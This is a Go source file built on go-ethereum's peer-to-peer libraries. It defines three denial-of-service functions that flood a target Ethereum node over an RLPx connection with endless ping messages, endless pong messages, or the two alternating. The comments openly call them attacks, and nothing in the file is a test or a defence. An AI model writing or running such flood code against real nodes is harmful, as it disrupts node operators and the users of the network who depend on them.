package main

import (
	"fmt"

	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/p2p/enode"
	"github.com/ethereum/go-ethereum/p2p/rlpx"
)

// PingFloodDOS implements a DoS attack by sending rapid ping messages
// This floods the target with ping messages at maximum speed
func PingFloodDOS(conn *rlpx.Conn, node *enode.Node) error {
	if conn == nil {
		return fmt.Errorf("no connection provided")
	}

	fmt.Printf("Starting ping flood attack on %s\n", node.URLv4())
	counter := 0

	for {
		// Create wrapper around the connection
		wrapper := &connWrapper{conn: conn}

		// Send ping message (empty RLP list as payload, like SendItems does)
		err := p2p.Send(wrapper, pingMsg, []interface{}{})
		if err != nil {
			return fmt.Errorf("failed to send ping message: %v", err)
		}

		counter++
		if counter%100 == 0 {
			fmt.Printf("Sent %d ping messages\n", counter)
		}
	}
}

// PongFloodDOS implements a DoS attack by sending rapid pong messages
// This floods the target with unsolicited pong messages
func PongFloodDOS(conn *rlpx.Conn, node *enode.Node) error {
	if conn == nil {
		return fmt.Errorf("no connection provided")
	}

	fmt.Printf("Starting pong flood attack on %s\n", node.URLv4())
	counter := 0

	for {
		// Create wrapper around the connection
		wrapper := &connWrapper{conn: conn}

		// Send pong message (empty RLP list as payload, like SendItems does)
		err := p2p.Send(wrapper, pongMsg, []interface{}{})
		if err != nil {
			return fmt.Errorf("failed to send pong message: %v", err)
		}

		counter++
		if counter%100 == 0 {
			fmt.Printf("Sent %d pong messages\n", counter)
		}
	}
}

// PingPongFloodDOS implements a DoS attack by alternating between ping and pong messages
// This creates a mixed flood of both message types
func PingPongFloodDOS(conn *rlpx.Conn, node *enode.Node) error {
	if conn == nil {
		return fmt.Errorf("no connection provided")
	}

	fmt.Printf("Starting ping-pong flood attack on %s\n", node.URLv4())
	counter := 0

	for {
		// Create wrapper around the connection
		wrapper := &connWrapper{conn: conn}

		// Alternate between ping and pong
		var err error
		if counter%2 == 0 {
			err = p2p.Send(wrapper, pingMsg, []interface{}{})
		} else {
			err = p2p.Send(wrapper, pongMsg, []interface{}{})
		}

		if err != nil {
			return fmt.Errorf("failed to send ping/pong message: %v", err)
		}

		counter++
		if counter%100 == 0 {
			fmt.Printf("Sent %d ping/pong messages\n", counter)
		}
	}
}
